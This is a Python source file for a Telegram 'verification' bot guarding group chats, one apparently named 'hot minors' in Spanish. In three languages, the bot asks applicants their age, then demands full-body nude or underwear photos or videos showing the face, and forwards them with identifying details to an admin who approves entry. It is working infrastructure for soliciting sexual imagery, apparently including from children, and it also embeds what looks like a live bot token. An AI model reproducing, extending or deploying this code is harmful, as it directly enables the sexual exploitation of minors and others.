import os

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ChatJoinRequestHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

TOKEN = "8797013447:AAHcfHxJC9H7RqfiegnUe2CMWCReUY32ozc"

pending_users = {}

GROUP_IDS = [
    -1003732522700,   # LOS MORTALES
    -1003936428271,   # MENORES CALIENTES
]

ADMIN_ID = 8011642705

TEXTS = {
    "es": {
        "welcome": (
            "🔒 Bienvenido al sistema de verificación de 𝙇𝙊𝙎 𝙈𝙊𝙍𝙏𝘼𝙇𝙀𝙎/MΞИФЯΞS CДLIΞИΓΞS.\n\n"

            "La verificación es 𝗢𝗕𝗟𝗜𝗚𝗔𝗧𝗢𝗥𝗜𝗔 y protege la seguridad del grupo y sus miembros.\n\n"

            "Enviá únicamente lo solicitado y 𝗘𝗫𝗔𝗖𝗧𝗔𝗠𝗘𝗡𝗧𝗘 como se indica.\n"
            "𝗙𝗢𝗧𝗢𝗦 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧𝗔𝗦, 𝗖𝗢𝗡𝗧𝗘𝗡𝗜𝗗𝗢 𝗙𝗔𝗟𝗦𝗢 𝗼 𝗳𝘂𝗲𝗿𝗮 𝗱𝗲 𝗹𝗮𝘀 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝗰𝗶𝗼𝗻𝗲𝘀 𝘀𝗲𝗿á𝗻 𝗥𝗘𝗖𝗛𝗔𝗭𝗔𝗗𝗢𝗦.\n\n"

            "𝘳𝘦𝘷𝘪𝘴𝘢𝘥𝘰 𝘱𝘰𝘳 𝘶𝘯 𝘏𝘜𝘔𝘈𝘕𝘖: 𝘴𝘰𝘭𝘪𝘤𝘪𝘵𝘶𝘥 𝘧𝘢𝘭𝘴𝘢 𝘴𝘦𝘳á 𝘌𝘓𝘐𝘔𝘐𝘕𝘈𝘋𝘈 𝘠 𝘜𝘚𝘜𝘈𝘙𝘐𝘖 𝘉𝘈𝘕𝘌𝘈𝘋𝘖 𝘋𝘌 𝘓𝘈 𝘍𝘌𝘋𝘌𝘙𝘈𝘊𝘐Ó𝘕 .\n\n"

            "PARA COMENZAR DECÍ TU EDAD 👀"
        ),

"ask_photo": (
    "Perfecto.\n\n"

    "📌Ahora enviá UNA FOTO o VIDEO permanente de cuerpo completo, PARADO Y CON CARA.\n"

    "✔Puede ser semidesnudo (sólo en ropa interior) o desnudo (preferiblemente).\n\n"

    "📌Hacé al menos 1 o 2 de estas señas (preferiblemente 2):\n"
    "🖖 🤙 🤞 🤟\n\n"

    "ENVIÁ EXACTAMENTE LO PEDIDO.\n"
    "será revisado por una persona, no pierdas tiempo con cosas falsa.\n"
    " HACE LAS SEÑAS Y RESPETA EL FORMATO O SERÁS BANEADO."
),

"invalid_photo":
    "⚠️ Debés enviar una FOTO o VIDEO válido.",

"sent":
    "✅ Solicitud enviada para revisión.",

"approved":
    "✅ Tu solicitud fue aprobada.",

"rejected":
    "❌ Tu solicitud fue rechazada.",
},

"en": {
    "welcome": (
        "🔒 Welcome to the 𝙇𝙊𝙎 𝙈𝙊𝙍𝙏𝘼𝙇𝙀𝙎/ MΞИФЯΞS CДLIΞИΓΞS verification system.\n\n"

        "Verification is 𝗠𝗔𝗡𝗗𝗔𝗧𝗢𝗥𝗬 and protects the safety of the group and its members.\n\n"

        "Send only what is requested and 𝗘𝗫𝗔𝗖𝗧𝗟𝗬 as instructed.\n"
        "𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗣𝗛𝗢𝗧𝗢𝗦, 𝗙𝗔𝗞𝗘 𝗖𝗢𝗡𝗧𝗘𝗡𝗧 𝗼𝗿 𝗮𝗻𝘆𝘁𝗵𝗶𝗻𝗴 𝗼𝘂𝘁𝘀𝗶𝗱𝗲 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗.\n\n"

        "𝘳𝘦𝘷𝘪𝘦𝘸𝘦𝘥 𝘣𝘺 𝘢 𝘏𝘜𝘔𝘈𝘕: 𝘧𝘢𝘬𝘦 𝘢𝘱𝘱𝘭𝘪𝘤𝘢𝘵𝘪𝘰𝘯𝘴 𝘸𝘪𝘭𝘭 𝘣𝘦 𝘋𝘌𝘓𝘌𝘛𝘌𝘋 𝘈𝘕𝘋 𝘛𝘏𝘌 𝘜𝘚𝘌𝘙 𝘉𝘈𝘕𝘕𝘌𝘋 𝘍𝘙𝘖𝘔 𝘛𝘏𝘌 𝘍𝘌𝘋𝘌𝘙𝘈𝘛𝘐𝘖𝘕.\n\n"

        "TO BEGIN, TELL YOUR AGE 👀"
    ),

    "ask_photo": (
        "Perfect.\n\n"

        "📌Now send ONE permanent FULL BODY PHOTO or VIDEO, STANDING AND WITH YOUR FACE VISIBLE.\n"

        "✔ It can be semi-nude (underwear only) or nude (preferably).\n\n"

        "📌Do at least 1 or 2 of these hand signs (preferably 2):\n"
        "🖖 🤙 🤞 🤟\n\n"

        "SEND EXACTLY WHAT IS REQUESTED.\n"
        "Photos, videos or content outside the instructions "
        "MAKE THE SIGNALS AND RESPECT THE FORMAT OR YOU WILL BE BANNED."
    ),

    "invalid_photo":
        "⚠️ You must send a valid PHOTO or VIDEO.",

    "sent":
        "✅ Request sent for review.",

    "approved":
        "✅ Your request was approved.",

    "rejected":
        "❌ Your request was rejected.",
},

  "pt": {
    "welcome": (
        "🔒 Bem-vindo ao sistema de verificação do 𝙇𝙊𝙎 𝙈𝙊𝙍𝙏𝘼𝙇𝙀𝙎/MΞИФЯΞS CДLIΞИΓΞS.\n\n"

        "A verificação é 𝗢𝗕𝗥𝗜𝗚𝗔𝗧Ó𝗥𝗜𝗔 e protege a segurança do grupo e de seus membros.\n\n"

        "Envie apenas o que foi solicitado e 𝗘𝗫𝗔𝗧𝗔𝗠𝗘𝗡𝗧𝗘 como indicado.\n"
        "𝗙𝗢𝗧𝗢𝗦 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗧𝗔𝗦, 𝗖𝗢𝗡𝗧𝗘Ú𝗗𝗢 𝗙𝗔𝗟𝗦𝗢 𝗼𝘂 𝗳𝗼𝗿𝗮 𝗱𝗮𝘀 𝗶𝗻𝘀𝘁𝗿𝘂çõ𝗲𝘀 𝘀𝗲𝗿ã𝗼 𝗥𝗘𝗝𝗘𝗜𝗧𝗔𝗗𝗢𝗦.\n\n"

        "𝘳𝘦𝘷𝘪𝘴𝘢𝘥𝘰 𝘱𝘰𝘳 𝘶𝘮 𝘏𝘜𝘔𝘈𝘕𝘖: 𝘴𝘰𝘭𝘪𝘤𝘪𝘵𝘢çõ𝘦𝘴 𝘧𝘢𝘭𝘴𝘢𝘴 𝘴𝘦𝘳ã𝘰 𝘌𝘓𝘐𝘔𝘐𝘕𝘈𝘋𝘈𝘚 𝘌 𝘖 𝘜𝘚𝘜Á𝘙𝘐𝘖 𝘚𝘌𝘙Á 𝘉𝘈𝘕𝘐𝘋𝘖 𝘋𝘈 𝘍𝘌𝘋𝘌𝘙𝘈ÇÃ𝘖.\n\n"

        "PARA COMEÇAR, DIGA SUA IDADE 👀"
    ),

    "ask_photo": (
        "Perfeito.\n\n"

        "📌Agora envie UMA FOTO ou VÍDEO permanente de CORPO INTEIRO, EM PÉ E COM O ROSTO VISÍVEL.\n"

        "✔ Pode ser seminu (apenas roupa íntima) ou nu (de preferência).\n\n"

        "📌Faça pelo menos 1 ou 2 destes sinais com as mãos (de preferência 2):\n"
        "🖖 🤙 🤞 🤟\n\n"

        "ENVIE EXATAMENTE O QUE FOI SOLICITADO.\n"
        "Fotos, vídeos ou conteúdo fora das instruções "
        "serão rejeitados e resultarão em banimento."
    ),

    "invalid_photo":
        "⚠️ Você deve enviar uma FOTO ou VÍDEO válido.",

    "sent":
        "✅ Solicitação enviada para revisão.",

    "approved":
        "✅ Sua solicitação foi aprovada.",

     "rejected":
            "❌ Sua solicitação foi rejeitada.",
    }
}
    
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Seleccioná tu idioma / Select your language / Selecione seu idioma",
        reply_markup=reply_markup
    )


async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    lang = query.data.split("_")[1]

    user = query.from_user

    if user.id not in pending_users:
        pending_users[user.id] = {}

    pending_users[user.id]["step"] = "age"
    pending_users[user.id]["lang"] = lang
    pending_users[user.id]["username"] = user.username
    pending_users[user.id]["name"] = user.full_name

    await query.edit_message_text(
        TEXTS[lang]["welcome"]
    )

    context.job_queue.run_once(
        send_warning,
        600,
        data=user.id
    )

async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.chat_join_request.from_user
    group_id = update.chat_join_request.chat.id

    # Ignorar grupos no autorizados
    if group_id not in GROUP_IDS:
        return

    pending_users[user.id] = {
        "group_id": group_id
    }

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:

        await context.bot.send_message(
            chat_id=user.id,
            text=(
                "🔒 𝙇𝙊𝙎 𝙈𝙊𝙍𝙏𝘼𝙇𝙀𝙎/MΞИФЯΞS CДLIΞИΓΞS Verification Bot\n\n"

                "Este bot realiza la verificación obligatoria para ingresar al grupo.\n\n"

                "This bot performs the mandatory verification required to join the group.\n\n"

                "Este bot realiza a verificação obrigatória para entrar no grupo.\n\n"

                "Seleccioná tu idioma para continuar.\n"
                "Select your language to continue.\n"
                "Selecione seu idioma para continuar."
            ),
            reply_markup=reply_markup
        )

    except Exception as e:
        print(f"No se pudo enviar mensaje: {e}")

async def send_warning(context: ContextTypes.DEFAULT_TYPE):

    user_id = context.job.data

    if user_id not in pending_users:
        return

    step = pending_users[user_id].get("step")

    if step == "done":
        return

    lang = pending_users[user_id].get("lang", "es")

    try:

        await context.bot.send_message(
            chat_id=user_id,
            text=TEXTS[lang]["warning"]
        )

    except:
        pass

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    # Ignorar mensajes fuera del privado
    if update.effective_chat.type != "private":
        return

    user_id = update.effective_user.id

    if user_id not in pending_users:
        return

    step = pending_users[user_id].get("step")
    lang = pending_users[user_id].get("lang", "es")

    # PEDIR EDAD
    if step == "age":

        if not update.message.text:

            await update.message.reply_text(
                "Please send only your age in numbers."
            )
            return

        if not update.message.text.isdigit():

            await update.message.reply_text(
                "Please send only your age in numbers."
            )
            return

        pending_users[user_id]["age"] = update.message.text
        pending_users[user_id]["step"] = "photo"

        await update.message.reply_text(
            TEXTS[lang]["ask_photo"]
        )

       # PEDIR FOTO O VIDEO
    elif step == "photo":

        age = pending_users[user_id]["age"]

        username = pending_users[user_id].get("username")
        name = pending_users[user_id].get("name")

        username_text = (
            f"@{username}"
            if username else "Sin @username"
        )

        # SI ENVÍA FOTO
        if update.message.photo:

            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=update.message.photo[-1].file_id,
                caption=(
                    f"📥 Solicitud nueva\n\n"

                    f"👤 Nombre: {name}\n"
                    f"🔗 Usuario: {username_text}\n"
                    f"🆔 ID: {user_id}\n"
                    f"🎂 Edad: {age}\n\n"

                    f"/aprobar {user_id}\n"
                    f"/rechazar {user_id}"
                )
            )

            await update.message.reply_text(
                TEXTS[lang]["sent"]
            )

            pending_users[user_id]["step"] = "done"

        # SI ENVÍA VIDEO
        elif update.message.video:

            await context.bot.send_video(
                chat_id=ADMIN_ID,
                video=update.message.video.file_id,
                caption=(
                    f"📥 Solicitud nueva\n\n"

                    f"👤 Nombre: {name}\n"
                    f"🔗 Usuario: {username_text}\n"
                    f"🆔 ID: {user_id}\n"
                    f"🎂 Edad: {age}\n\n"

                    f"/aprobar {user_id}\n"
                    f"/rechazar {user_id}"
                )
            )

            await update.message.reply_text(
                TEXTS[lang]["sent"]
            )

            pending_users[user_id]["step"] = "done"

        else:

            await update.message.reply_text(
                "⚠️ Debés enviar una FOTO o VIDEO válido."
            )


async def aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    group_id = pending_users[user_id]["group_id"]

    await context.bot.approve_chat_join_request(
        chat_id=group_id,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "✅ Approved."
    )

    await update.message.reply_text(
        "Usuario aprobado."
    )


async def rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    group_id = pending_users[user_id]["group_id"]

    await context.bot.decline_chat_join_request(
        chat_id=group_id,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "❌ Rejected."
    )

    await update.message.reply_text(
        "Usuario rechazado."
    )


app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))

app.add_handler(CallbackQueryHandler(language_selected))

app.add_handler(ChatJoinRequestHandler(join_request))

app.add_handler(
    MessageHandler(
        ~filters.COMMAND,
        handle_message
    )
)

app.add_handler(CommandHandler("aprobar", aprobar))
app.add_handler(CommandHandler("rechazar", rechazar))

print("Bot iniciado...")

app.run_polling()
